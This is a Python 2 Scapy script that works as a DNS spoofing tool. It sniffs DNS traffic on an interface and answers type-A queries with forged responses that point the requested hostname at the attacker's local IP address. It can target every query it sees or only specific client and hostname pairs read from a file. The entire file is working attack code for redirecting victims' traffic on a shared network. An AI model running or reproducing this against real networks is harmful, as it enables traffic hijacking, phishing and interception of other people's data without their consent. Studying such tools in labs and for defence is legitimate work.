from scapy.all import *
import sys, getopt
import netifaces

def callback(map, local_ip):
    def callback_func(pkt):
        if not DNS in pkt:
            return
        # if IP in pkt:
        #     print repr(pkt[IP])
        if not DNSQR in pkt:
            return
        is_query = (pkt[DNS].qr == 0)
        is_ancnt_0 = (pkt[DNS].ancount == 0)
        is_type_A = (pkt[DNSQR].qtype == 1)
        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst
        q_name = str(pkt[DNSQR].qname)
        d_port = pkt[UDP].dport
        s_port = pkt[UDP].sport
        txn_id = pkt[DNS].id
        # print "is_query: {0}, is_ancnt: {1}, is_type_A: {2}, type_A:{3}".format(is_query, is_ancnt_0, is_type_A,
        #                                                                         pkt[DNSQR].qtype)
        if len(map) == 0:
            if is_query and is_ancnt_0 and is_type_A and src_ip != local_ip:
                if q_name:
                    spoofed_packet = IP(dst=src_ip, src=dst_ip) \
                                     / UDP(dport=s_port, sport=d_port) \
                                     / DNS(id=txn_id, ancount=1, qr=1, an=DNSRR(rrname=q_name, rdata=local_ip))
                    send(spoofed_packet, verbose=0)
                    # return 'Spoofed DNS Response Sent - URL: {0}'.format(pkt[DNSQR].qname, str(pkt[DNS].id), local_ip)
                    return 'Spoofed DNS Response Sent - {0}'.format(spoofed_packet.summary)
                else:
                    return
        else:
            is_url_match = ((src_ip, q_name) in map)
            # print "Url match: {0}".format(is_url_match)
            if q_name and is_query and is_ancnt_0 and is_type_A and ((src_ip, q_name) in map):
                spoofed_packet = IP(dst=src_ip, src=dst_ip) \
                                 / UDP(dport=s_port, sport=d_port) \
                                 / DNS(id=txn_id, ancount=1, qr=1,an=DNSRR(rrname=q_name, rdata=local_ip))
                send(spoofed_packet, verbose=0)
                return 'Spoofed DNS Response Sent - URL: {0}'.format(spoofed_packet.summary)
            else:
                return

    return callback_func


def get_local_ip(interface_name):
    return netifaces.ifaddresses(interface_name)[netifaces.AF_INET][0]['addr'].encode("UTF-8")


def parse_args(argv):
    hosts_file = ''
    interface_name = ''
    try:
        opts, args = getopt.getopt(argv, "h:i:")
    except getopt.GetoptError:
        print 'Incorrect format of args. Expected: [-i interface] [-h hostnames] expression'
        sys.exit(2)
    l = len(args)
    if l > 1:
        print 'Too many arguments.  Expected: [-i interface] [-h hostnames] expression'
        sys.exit(2)
    if l < 1:
        print 'Too few arguments.  Expected: [-i interface] [-h hostnames] expression'
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            hosts_file = arg
        elif opt == "-i":
            interface_name = arg

    return hosts_file, interface_name, args[0]


def get_fallback_default_interface():
    return netifaces.interfaces()[0]


def get_default_interface():
    gateways = netifaces.gateways()
    if not gateways:
        return get_fallback_default_interface()
    def_gateway = gateways['default']
    if not def_gateway:
        return get_fallback_default_interface()
    return def_gateway[netifaces.AF_INET][1].encode("UTF-8")


def main(argv):
    map = set()
    hosts_file, interface_name, bpf_expr = parse_args(argv)
    if hosts_file is not '':
        try:
            with open(hosts_file) as f:
                for line in f:
                    ip, url = line.partition(" ")[::2]
                    ip = ip.strip()
                    url = url.strip()
                    if not url.endswith("."):
                        url += "."
                    map.add((ip, url))

            print "Watching for requests: " + str(map)
        except OSError:
            print('Error in opening host_mapping file:' + hosts_file)
            sys.exit(2)

    bpf_filt = 'udp port 53' if (bpf_expr is '') else bpf_expr
    interface = get_default_interface() if interface_name is '' else interface_name
    local_ip = get_local_ip(interface)
    print 'Listening on interface: {0}, local IP: {1}'.format(interface, local_ip)
    print local_ip
    sniff(iface=interface, filter=bpf_filt, prn=callback(map, local_ip))


if __name__ == "__main__":
    main(sys.argv[1:])
